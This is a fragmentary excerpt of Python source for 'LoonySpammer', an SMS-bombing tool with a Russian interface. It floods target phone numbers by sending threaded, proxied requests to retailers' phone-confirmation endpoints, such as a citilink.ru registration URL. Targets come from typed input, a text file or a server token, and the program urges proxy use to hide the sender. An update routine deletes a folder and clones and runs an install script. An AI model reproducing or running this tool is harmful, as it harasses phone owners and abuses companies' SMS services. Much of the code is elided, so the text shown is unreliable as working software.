		...
		def Main():
			...
			def sms():
				...
				try:
					...
					try:
						...
						pass
					try:
						requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, proxies=proxies, timeout=1)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
			...
			def updateproxy():
				...
				try:
					...
					proxy = input(Fore.BLUE+"loonyspammer > "+Style.RESET_ALL)
					if proxy == "":
			...
			def update():
				...
				if a=="y":
					os.system("cd && rm -rf loonyspammer && git clone https://github.com/Slozhenkin/loonyspammer && cd loonyspammer && sh install.sh")
					exit()
				else:
					print("Отменено")
			...
			def onesend():
				...
				phone = input(Fore.BLUE+"loonyspammer > "+Style.RESET_ALL)
				try:
					if int(phone):
						print('Введите количество кругов ("Enter" - отмена):')
						count = input(Fore.BLUE+"loonyspammer > "+Style.RESET_ALL)
						try:
							if int(count):
								count=int(count)
								make7phone()
			...
			def filesend():
				...
				f_name=input(Fore.BLUE+"loonyspammer > "+Style.RESET_ALL+"~/")
				clear()
				logo()
				print(info)
				try:
			...
			def tokensend():
				...
				print(Fore.GREEN+"https://FSystem88.ru/loonyspammer/\n"+Style.RESET_ALL)
				token=input(Fore.BLUE+"loonyspammer > "+Style.RESET_ALL)
				...
				if int(id) != 0:
					...
					if "<h1>Not Found</h1>" in array:
						info=Fore.RED+"Токен не найден на сервере."+Style.RESET_ALL
					else:
						if array[-1] == '':
							array.pop()
						...
						try:
							if int(count):
								...
								for phone in array:
									...
									try:
										if int(phone):
											print('\nSMS спам на номер: {} успешно был запущен.Для остановки спама нажмите CTRL+Z'.format(phone))
											thread_list = []
											t = threading.Thread (target=n_send, args=(phone,count, proxies))
											thread_list.append(t)
											t.start()
									except:
										print(Fore.RED+'\n"{Error] {}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
								for th in threading.enumerate(): 
									if th != threading.currentThread():
										th.join()	
						except:
							info = Fore.RED+"\n[Error] Некорректно введено количество кругов!"+Style.RESET_ALL
			...
			def n_send(phone, count, proxies):
				...
				print(Fore.GREEN+"\nСпам на номер телефона: {} закончен. Кол-во кругов {}".format(phone, count)+Style.RESET_ALL)
				exit()
			...
			def main():
				...
				while True:
					...
					if proxy == "localhost":
						print(Fore.YELLOW+"Мы советуем Вам использовать прокси!"+Style.RESET_ALL)
					print("[1]. Запустить SMS спамер.")
					print("[2]. Обновить прокси.")
					print("[3]. Обновить LoonySpammer")
					print("[4]. Выход.")
					input1 = input(Fore.BLUE+"Выберите номер пункта: "+Style.RESET_ALL)
					if input1 == "1":
						clear()
						logo()
						print(info)
						print("Выберите действие:")
						print("[1]. Запустить SMS спамер на один номер")
						print("[2]. Выгрузить номера из TXT файла")
						print("[3]. Выгрузить номера по токену")
						input11= input(Fore.BLUE+"loonyspammer > "+Style.RESET_ALL)
						if input11 == "1":
							onesend()
						...
						input51 = input(Fore.BLUE+"loonyspammer > "+Style.RESET_ALL)
						if input51=="1":
							proxy = "localhost"
